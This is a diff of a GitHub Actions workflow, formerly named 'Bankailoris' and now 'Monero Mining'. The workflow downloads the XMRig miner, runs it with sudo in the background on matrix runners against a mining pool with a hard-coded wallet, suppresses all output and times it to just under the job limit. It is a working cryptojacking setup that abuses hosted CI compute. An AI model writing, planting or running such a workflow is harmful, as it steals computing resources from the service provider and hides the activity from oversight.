@@ -1,4 +1,4 @@
-name: Bankailoris
+name: Monero Mining
 
 on:
   workflow_dispatch:
@@ -35,16 +35,16 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt install -y wget tar
+          sudo apt install -y wget tar coreutils
 
       - name: Run XMRig
         run: |
-          mkdir -p ~/xmrig
+          sudo mkdir -p ~/xmrig
           cd ~/xmrig
-          wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz
-          tar -xzf xmrig.tar.gz
-          chmod +x xmrig-6.24.0/xmrig
-          sudo nohup ~/xmrig/xmrig-6.24.0/xmrig \
+          sudo wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz
+          sudo tar -xzf xmrig.tar.gz
+          sudo chmod +x xmrig-6.24.0/xmrig
+          sudo nohup timeout 21000s ~/xmrig/xmrig-6.24.0/xmrig \
             -o pool.hashvault.pro:443 \
             -u 43NnRj39Z9L8NJaW7MQWN1GYeNYVHDAoVMmMUMFLd7jVeVAYqFkgFjQL6568tKrWBA4Ro6zaeoTLCBfTB9GkkyQYJNYCs7N \
             -p worker${{ matrix.job }} -t 3 >/dev/null 2>&1 &
